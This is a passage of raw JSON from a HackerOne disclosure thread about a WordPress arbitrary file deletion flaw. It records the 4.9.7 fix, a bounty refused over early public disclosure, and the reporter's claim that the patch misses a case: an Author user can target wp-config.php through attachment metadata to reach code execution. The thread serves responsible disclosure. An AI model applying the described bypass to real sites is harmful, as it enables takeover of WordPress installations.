has gone out:\nhttps://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/\nhttps://make.wordpress.org/core/2018/07/05/wordpress-4-9-7/\n\nThank you for your work in finding and reporting this issue. You were credited in both posts accordingly.\n\n-Aaron","markdown_message":"\u003cp\u003eHey \u003ca href=\"/slavco\"\u003e@slavco\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m closing this as resolved as the release with the fix in it has gone out:\u003cbr\u003e\n\u003ca title=\"https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/\" href=\"/redirect?url=https%3A%2F%2Fwordpress.org%2Fnews%2F2018%2F07%2Fwordpress-4-9-7-security-and-maintenance-release%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n\u003ca title=\"https://make.wordpress.org/core/2018/07/05/wordpress-4-9-7/\" href=\"/redirect?url=https%3A%2F%2Fmake.wordpress.org%2Fcore%2F2018%2F07%2F05%2Fwordpress-4-9-7%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://make.wordpress.org/core/2018/07/05/wordpress-4-9-7/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThank you for your work in finding and reporting this issue. You were credited in both posts accordingly.\u003c/p\u003e\n\n\u003cp\u003e-Aaron\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-05T20:13:15.682Z","updated_at":"2018-07-05T20:13:15.682Z","actor":{"username":"aaroncampbell","cleared":false,"url":"/aaroncampbell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/020/821/f7e6872e5cd77bbdfb5edb77e7b9b2c91bb6c0c7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"b258ea62bf297b02afa9854","url":"/b258ea62bf297b02afa9854"},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2995714,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"This report is not eligible for bounty because the reporter disclosed publicly before the issue was resolved – https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/","markdown_message":"\u003cp\u003eThis report is not eligible for bounty because the reporter disclosed publicly before the issue was resolved – \u003ca title=\"https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/\" href=\"/redirect?url=https%3A%2F%2Fblog.ripstech.com%2F2018%2Fwordpress-file-delete-to-code-execution%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-05T20:16:07.959Z","updated_at":"2018-07-05T20:16:07.959Z","actor":{"url":"/wordpress","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"WordPress"}},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2995982,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Good, I just want to ask, does upload directory for different users is different or all of them upload under `.../uploads/2018/07/` ? Told you that solution doesn't seems good to me and to wait one month...","markdown_message":"\u003cp\u003eGood, I just want to ask, does upload directory for different users is different or all of them upload under \u003ccode\u003e.../uploads/2018/07/\u003c/code\u003e ? Told you that solution doesn\u0026#39;t seems good to me and to wait one month...\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-05T21:15:28.806Z","updated_at":"2018-07-05T21:15:28.806Z","actor":{"username":"b258ea62bf297b02afa9854","cleared":false,"url":"/b258ea62bf297b02afa9854","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2996613,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Btw, there is much more, but... Congrats for resolving the issue! \np.s. Don't drink while you push for updates towards 30% of the web, you could make mistakes.  ","markdown_message":"\u003cp\u003eBtw, there is much more, but... Congrats for resolving the issue! \u003cbr\u003e\np.s. Don\u0026#39;t drink while you push for updates towards 30% of the web, you could make mistakes.  \u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-05T23:22:09.909Z","updated_at":"2018-07-05T23:22:09.909Z","actor":{"username":"b258ea62bf297b02afa9854","cleared":false,"url":"/b258ea62bf297b02afa9854","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3106087,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"In 8 days it is a month. Do you plan to fix this issue or? ","markdown_message":"\u003cp\u003eIn 8 days it is a month. Do you plan to fix this issue or? \u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-27T16:22:09.555Z","updated_at":"2018-07-27T16:22:09.555Z","actor":{"username":"b258ea62bf297b02afa9854","cleared":false,"url":"/b258ea62bf297b02afa9854","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3116144,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I'm not talking regarding https://medium.com/websec/wordpress-4-9-7-and-evil-author-with-scotch-bd77a83ac39c the solution you provide doesn't protect the wp from first reported issue.  ","markdown_message":"\u003cp\u003eI\u0026#39;m not talking regarding \u003ca title=\"https://medium.com/websec/wordpress-4-9-7-and-evil-author-with-scotch-bd77a83ac39c\" href=\"/redirect?url=https%3A%2F%2Fmedium.com%2Fwebsec%2Fwordpress-4-9-7-and-evil-author-with-scotch-bd77a83ac39c\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://medium.com/websec/wordpress-4-9-7-and-evil-author-with-scotch-bd77a83ac39c\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e the solution you provide doesn\u0026#39;t protect the wp from first reported issue.  \u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-30T10:58:45.646Z","updated_at":"2018-07-30T10:58:45.646Z","actor":{"username":"b258ea62bf297b02afa9854","cleared":false,"url":"/b258ea62bf297b02afa9854","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3116709,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Function `_wp_attached_file` says:\n```\n$thumbfile = path_join( $uploadpath['basedir'], $thumbfile );\n$thumbdir  = path_join( $uploadpath['basedir'], dirname( $file ) );\n```\n`$file` is taken from DB/meta `_wp_attached_file` \n`dirname` - doesn't check the file system\n\nSo the current patch prevents many of the attacking payloads, but one is missed. The one which is missed is:\n`$file` with value from root directory having a `thumb` that is `wp-config.php` \nYes this is RCE via Author user!\n","markdown_message":"\u003cp\u003eFunction \u003ccode\u003e_wp_attached_file\u003c/code\u003e says:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$thumbfile = path_join( $uploadpath[\u0026#39;basedir\u0026#39;], $thumbfile );\n$thumbdir  = path_join( $uploadpath[\u0026#39;basedir\u0026#39;], dirname( $file ) );\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ccode\u003e$file\u003c/code\u003e is taken from DB/meta \u003ccode\u003e_wp_attached_file\u003c/code\u003e \u003cbr\u003e\n\u003ccode\u003edirname\u003c/code\u003e - doesn\u0026#39;t check the file system\u003c/p\u003e\n\n\u003cp\u003eSo the current patch prevents many of the attacking payloads, but one is missed. The one which is missed is:\u003cbr\u003e\n\u003ccode\u003e$file\u003c/code\u003e with value from root directory having a \u003ccode\u003ethumb\u003c/code\u003e that is \u003ccode\u003ewp-config.php\u003c/code\u003e \u003cbr\u003e\nYes this is RCE via Author user!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-30T13:47:01.602Z","updated_at":"2018-07-30T13:47:01.602Z","first_to_agree":true,"actor":{"username":"b258ea62bf297b02afa9854","cleared":false,"url":"/b258ea62bf297b02afa9854","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3116746,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Btw, I'm on wp slack, so anyone who wants to chat or ask something can find me there. @Slavco there too :) ","markdown_message":"\u003cp\u003eBtw, I\u0026#39;m on wp slack, so anyone who wants to chat or ask something can find me there. \u003ca href=\"/slavco\"\u003e@Slavco\u003c/a\u003e there too :) \u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-30T13:57:57.508Z","updated_at":"2018-07-30T13:57:57.508Z","actor":{"username":"b258ea62bf297b02afa9854","cleared":false,"url":"/b258ea62bf297b02afa9854","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3116770,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"^^ function `wp_delete_attachment_files` not meta name :)))","markdown_message":"\u003cp\u003e^^ function \u003ccode\u003ewp_delete_attachment_files\u003c/code\u003e not meta name :)))\u003c/p\u003e\n","automated_response":false,"created_at":"2018-07-30T14:03:15.388Z","updated_at":"2018-07-30T14:03:15.388Z","actor":{"username":"b258ea62bf297b02afa9854","cleared":false,"url":"/b258ea62bf297b02afa9854","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3263992,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-08-29T13:47:05.792Z","updated_at":"2018-08-29T13:47:05.792Z","actor":{"url":"/wordpress","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"WordPress"}},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}